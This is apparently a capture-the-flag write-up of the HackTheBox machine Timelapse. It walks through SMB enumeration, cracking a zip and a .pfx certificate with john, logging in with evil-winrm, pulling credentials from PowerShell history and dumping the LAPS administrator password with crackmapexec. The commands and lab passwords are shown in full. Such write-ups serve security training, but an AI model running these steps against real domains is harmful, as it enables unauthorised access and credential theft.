# HackTheBox - Timelapse


This post is focused on the walkthrough of Easy Machine Timelapse from HackTheBox.

<!--more-->

## Enumeration

Starting out with the initial nmap scan.

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ nmap -A -vv -Pn 10.10.11.152 -oN nmapN

PORT    STATE SERVICE       REASON  VERSION
53/tcp  open  domain        syn-ack Simple DNS Plus
88/tcp  open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-08-18 16:40:28Z)
135/tcp open  msrpc         syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds? syn-ack
464/tcp open  kpasswd5?     syn-ack
593/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp open  ldapssl?      syn-ack
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m03s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64147/tcp): CLEAN (Timeout)
|   Check 2 (port 32357/tcp): CLEAN (Timeout)
|   Check 3 (port 16288/udp): CLEAN (Timeout)
|   Check 4 (port 22941/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-08-18T16:40:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```

Enumerating ```smb``` we found some shares listed.

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ smbclient -L 10.10.11.152                               
Password for [WORKGROUP\saad]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share
```

Looking at the ```Shares``` share we have two directories ```Dev``` and ```HelpDesk```

```bash
smbclient \\\\10.10.11.152\\Shares

Password for [WORKGROUP\saad]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

```

The ```HelpDesk``` directory has some files related to ```LAPS```. But nothing seems useful for now.

```bash
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
```

The ```Dev``` directory has a file ```winrm_backup.zip``` which we can analyze.

```bash
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
```

## Foothold

The ```zip``` file is password protected which we can crack using ```john```.

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ zip2john winrm_backup.zip > john.hash
```
```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ john --wordlist=/home/saad/Documents/wordlists/rockyou.txt john.hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:01 DONE (2022-08-18 04:50) 0.6535g/s 2267Kp/s 2267Kc/s 2267KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Extracting the ```zip``` we get a ```legacyy_dev_auth.pfx``` file.

Looking for the ```.pfx``` files.

{{< admonition tip ".pfx files" >}}
The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys.
{{< /admonition >}}

Source: https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file

Before extracting the certificate, we need to crack the password of ```.pfx``` file. We'll do this using ```john``` as well. 

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ pfx2john legacyy_dev_auth.pfx > pfx.hash
```

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ john --wordlist=/home/saad/Documents/wordlists/rockyou.txt pfx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:04:12 DONE (2022-08-18 05:08) 0.003963g/s 12808p/s 12808c/s 12808C/s thuglife06..thug211                                                    
Use the "--show" option to display all of the cracked passwords reliably                                                                            
Session completed.
```

Now we'll follow the instructions [here](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) to extract the certificate and private key from the ```.pfx``` file.

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
Enter Import Password:thuglegacy
```

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key
Enter Import Password:thuglegacy
Enter PEM pass phrase:thuglegacy
Verifying - Enter PEM pass phrase:thuglegacy
```

## user.txt

Now we'll use ```evil-winrm``` to login with the ```certificate``` and ```key```.

```
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ evil-winrm -i 10.10.11.152 -c legacyy.crt -k legacyy.key -S

Evil-WinRM shell v3.3

Enter PEM pass phrase:thuglegacy
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
a******************************8
*Evil-WinRM* PS C:\Users\legacyy\Desktop> 
```

## Lateral Movement

Analyzing the ```winPEAS``` output we found something interesting.

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Analyzing Windows Files Files (limit 70)
    C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Default\NTUSER.DAT
    C:\Users\legacyy\NTUSER.DAT
```

Reading the ```ConsoleHost_history.txt``` file.

```
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We got credentials of another user ```svc_deploy```.

Logging into ```svc_deploy```.

```
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ evil-winrm -S -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

Evil-WinRM shell v3.3

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

Notice that this user is part of ```TIMELAPSE\LAPS_Readers``` group.

## Privilege Escalation

Looking for privilege escalation using LAPS.

{{< admonition tip "LAPS" >}}
LAPS simplifies password management while helping customers implement recommended defenses against cyberattacks. In particular, the solution mitigates the risk of lateral escalation that results when customers use the same administrative local account and password combination on their computers. LAPS stores the password for each computer’s local administrator account in Active Directory, secured in a confidential attribute in the computer’s corresponding Active Directory object.
{{< /admonition >}}

Source: https://www.hackingarticles.in/credential-dumpinglaps/

Looking further on the same [article](https://www.hackingarticles.in/credential-dumpinglaps/), there are a bunch of methods to dump ```Administrator``` password. 

I used ```crackmapexec``` to dump the ```Administrator``` password.

```bash
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' –kdcHost 10.10.11.152 -M laps
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer: DC01$                Password: 8qRr)lFd9+fHLk47l(N.v%tj
                                                                    
```

Now login to ```Administrator``` using ```evil-winrm```.

```
┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
└─$ evil-winrm -S -i 10.10.11.152 -u Administrator -p '8qRr)lFd9+fHLk47l(N.v%tj'

Evil-WinRM shell v3.3

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

## root.txt

Usually the ```root.txt``` is located at ```C:\Users\Administrator\Desktop\``` for windows machines but for this machine it is located at ```C:\Users\TRX\Desktop```.

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force

    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/18/2022   8:29 AM             34 root.txt
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat C:\Users\TRX\Desktop\root.txt
e******************************4
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```

**Thanks for reading!**
